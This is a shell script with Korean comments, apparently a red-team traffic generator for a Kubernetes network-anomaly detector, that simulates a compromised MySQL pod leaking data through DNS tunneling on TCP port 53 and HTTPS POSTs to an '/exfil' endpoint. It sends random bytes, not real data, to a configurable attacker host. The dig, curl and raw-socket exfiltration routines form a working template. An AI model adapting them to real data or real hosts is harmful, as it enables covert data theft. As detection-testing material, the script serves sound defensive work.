#!/bin/sh
# mysql_e1.sh — [structural] 침해된 mysql → 화이트리스트 통과 exfil (TCP:53 DNS tunnel + HTTPS:443)
#   위협 모델: mysql pod 침해 후 결과셋을 화이트리스트가 반드시 열어놓는 채널로 유출.
#     - TCP:53 (DNS tunneling, dnscat2/iodine 실제 도구) — 모든 pod 의 DNS 조회에 필수
#     - HTTPS:443 (kube API/외부 API 콜) — 대부분 클러스터에서 열림
#   화이트리스트 방어 한계: 둘 다 정상 서비스에 필수라 차단 불가.
#   DeepMesh 관점: flow_features 의 dst_port 슬롯에 :53 없음(rule matcher 원천 불가).
#     :443 은 api443 슬롯에 걸리지만 정상 앱은 API 서버로만 감(attacker 는 다른 dst IP).
#     정상 mysql outbound = 응답(src_port=3306) 인데 e1 = mysql 이 연결 개시자(dst_port=53 or 443).
#     signature 후보: syn 시퀀스 + haspay + 크기 분포 — 재학습 없이 잡히는지가 논지 실증 지점.
. "$(dirname "$0")/common.sh"

# ATTACKER_HOST: CoreDNS pod IP(:53 정상 응답) + 우리가 통제한다는 가정.
#   실제로는 exfiltrated data 가 attacker 에게 전달되는 흐름이지만, 여기선 traffic 재현이 목적.
ATTACKER_HOST="${ATTACKER_HOST:-}"
[ -z "$ATTACKER_HOST" ] && ATTACKER_HOST="10.96.0.10"     # CoreDNS ClusterIP 기본값(kube-system)
DNS_PORT="${DNS_PORT:-53}"
HTTPS_PORT="${HTTPS_PORT:-443}"
CHUNK_SIZE="${CHUNK_SIZE:-32}"                            # DNS label 63자 이하 → 32B 청크
HTTPS_CHUNK="${HTTPS_CHUNK:-4096}"                        # HTTPS 청크(대량 유출)
N_ROUNDS="${N_ROUNDS:-40}"                                # 총 라운드 수(각 라운드=DNS+HTTPS 병행)

# 도구 확인: dig(TCP:53) + curl/wget(HTTPS:443)
DIG_BIN=""
for b in dig drill kdig; do
  command -v "$b" >/dev/null 2>&1 && DIG_BIN="$b" && break
done
HTTP_BIN=""
for b in curl wget; do
  command -v "$b" >/dev/null 2>&1 && HTTP_BIN="$b" && break
done
USE_PY=0
if [ -z "$DIG_BIN" ] || [ -z "$HTTP_BIN" ]; then
  if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
    PY=$(command -v python3 || command -v python); USE_PY=1
  else
    echo "[mysql_e1] dig/curl/python 없음 — ephemeral 컨테이너에서 dnsutils+curl 이미지 필요" >&2
    exit 3
  fi
fi

# DNS tunneling 요청 함수: 32B base32 payload 를 서브도메인에 실어 TCP:53 조회
dns_exfil() {
  payload=$(dd if=/dev/urandom bs=1 count="$CHUNK_SIZE" 2>/dev/null | base32 | head -c "$CHUNK_SIZE" | tr '=' '0')
  QNAME="${payload}.exfil.tunnel.local"
  if [ -n "$DIG_BIN" ]; then
    "$DIG_BIN" +tcp +tries=1 +time=2 @"$ATTACKER_HOST" "$QNAME" A >/dev/null 2>&1
  elif [ "$USE_PY" = "1" ]; then
    "$PY" -c "
import socket, struct, random
q='$QNAME'
labels=b''.join(bytes([len(p)])+p.encode() for p in q.split('.'))+b'\x00'
tid=random.randint(0,65535)
msg=struct.pack('>HHHHHH',tid,0x0100,1,0,0,0)+labels+struct.pack('>HH',1,1)
try:
    s=socket.create_connection(('$ATTACKER_HOST',$DNS_PORT), timeout=2)
    s.sendall(struct.pack('>H',len(msg))+msg); s.recv(4096); s.close()
except Exception: pass
" 2>/dev/null
  fi
}

# HTTPS exfil 함수: 대량 payload 를 POST /exfil (attacker endpoint)
https_exfil() {
  URL="https://${ATTACKER_HOST}:${HTTPS_PORT}/exfil"
  payload=$(dd if=/dev/urandom bs=1 count="$HTTPS_CHUNK" 2>/dev/null | base64 | head -c "$HTTPS_CHUNK")
  if [ "$HTTP_BIN" = "curl" ]; then
    curl -k -s --max-time 5 -X POST "$URL" \
         -H "Content-Type: application/octet-stream" \
         --data-binary "$payload" >/dev/null 2>&1
  elif [ "$HTTP_BIN" = "wget" ]; then
    wget -q -O /dev/null --timeout=5 --no-check-certificate --post-data="$payload" "$URL" 2>/dev/null
  elif [ "$USE_PY" = "1" ]; then
    # python 폴백: raw TCP:443 로 대충 큰 페이로드 전송(TLS handshake 실패해도 SYN/payload 는 나감)
    "$PY" -c "
import socket
p=b'$payload'
try:
    s=socket.create_connection(('$ATTACKER_HOST',$HTTPS_PORT), timeout=5)
    s.sendall(b'POST /exfil HTTP/1.1\r\nHost: attacker\r\nContent-Length: '+str(len(p)).encode()+b'\r\n\r\n'+p)
    s.close()
except Exception: pass
" 2>/dev/null
  fi
}

i=0
while [ "$i" -lt "$N_ROUNDS" ]; do
  # 각 라운드: DNS tunnel 2회 + HTTPS 1회 (실제 도구도 DNS 위주 + 대량 시 HTTPS 병행)
  dns_exfil
  dns_exfil
  https_exfil
  i=$((i+1))
  sleep 0.4
done
echo "[mysql_e1] done N_ROUNDS=$N_ROUNDS via TCP:${DNS_PORT} DNS tunnel + HTTPS:${HTTPS_PORT} → $ATTACKER_HOST"